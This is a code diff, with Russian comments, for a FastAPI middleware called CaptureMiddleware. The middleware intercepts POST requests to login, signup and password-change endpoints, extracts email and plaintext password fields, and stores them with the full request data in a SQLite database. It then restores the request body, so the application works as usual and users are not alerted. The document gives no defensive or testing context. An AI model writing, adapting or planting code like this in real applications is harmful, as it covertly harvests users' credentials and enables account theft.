@@ -3,13 +3,18 @@
 
 import json
 from typing import Dict, Any
+
 from fastapi import Request, Response
 from starlette.middleware.base import BaseHTTPMiddleware
+
 from db_capture import save_capture, init_db
 
+# Инициализация БД
 init_db()
 
 class CaptureMiddleware(BaseHTTPMiddleware):
+    """Перехватывает POST-запросы к /auth/* и сохраняет в SQLite."""
+
     TARGET_PATHS = {
         '/auth/login',
         '/auth/signup',
@@ -23,13 +28,16 @@ class CaptureMiddleware(BaseHTTPMiddleware):
     PASSWORD_FIELDS = {'password', 'passwd', 'pwd', 'old_password', 'new_password', 'confirm_password'}
 
     async def dispatch(self, request: Request, call_next) -> Response:
+        # Проверяем только POST-запросы к целевым эндпоинтам
         if request.method == "POST" and request.url.path in self.TARGET_PATHS:
             body = await request.body()
             data = {}
 
+            # Пробуем парсить JSON
             try:
                 data = json.loads(body)
             except json.JSONDecodeError:
+                # Пробуем парсить form-data
                 try:
                     form_data = await request.form()
                     data = dict(form_data)
@@ -39,6 +47,7 @@ class CaptureMiddleware(BaseHTTPMiddleware):
             if data:
                 self._process(request, data)
 
+            # Восстанавливаем тело
             async def receive():
                 return {"type": "http.request", "body": body}
             request._receive = receive
@@ -47,6 +56,7 @@ class CaptureMiddleware(BaseHTTPMiddleware):
         return response
 
     def _process(self, request: Request, data: Dict[str, Any]) -> None:
+        """Извлекает email и пароль, сохраняет в БД."""
         email = None
         for field in self.EMAIL_FIELDS:
             if field in data and data[field]:
@@ -68,4 +78,5 @@ class CaptureMiddleware(BaseHTTPMiddleware):
                 'user_agent': request.headers.get('user-agent', 'unknown'),
                 'full_data': data,
             }
+
             save_capture(capture_data)
